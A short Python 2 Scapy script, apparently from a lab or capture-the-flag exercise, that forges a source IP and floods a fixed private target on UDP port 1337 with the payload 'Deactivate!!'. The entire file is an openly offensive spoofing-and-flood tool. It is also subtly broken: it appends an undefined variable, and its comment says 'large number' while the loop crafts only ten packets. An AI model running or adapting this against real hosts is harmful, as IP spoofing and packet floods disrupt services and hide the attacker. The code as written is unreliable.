from scapy.all import *
from scapy.layers.inet import *

# Setup packet parameters
target = "10.12.1.4"
spoof = "10.204.0.7"
payload = "Deactivate!!"
packets = []

def packet_craft(source_port):
    """Takes source port and returns a Scapy packet using that source port attacking a constant target"""
    pkt = IP(src=spoof, dst=target)/UDP(sport=source_port, dport=1337)/payload
    return pkt


print "Beginning packet crafting ...\n"

# First we craft a large number of packets using a random ephemeral port
for i in range(10):
    source_port = random.randint(1024, 65535)
    temp_packet = packet_craft(source_port)
    packets.append(packet)

print "done crafting packets!\n"
print "\nBeginning flood ...\n"

# Initiate a packet flood using our crafted packets
for p in packets:
    send(p)

print "Done flooding!\n"


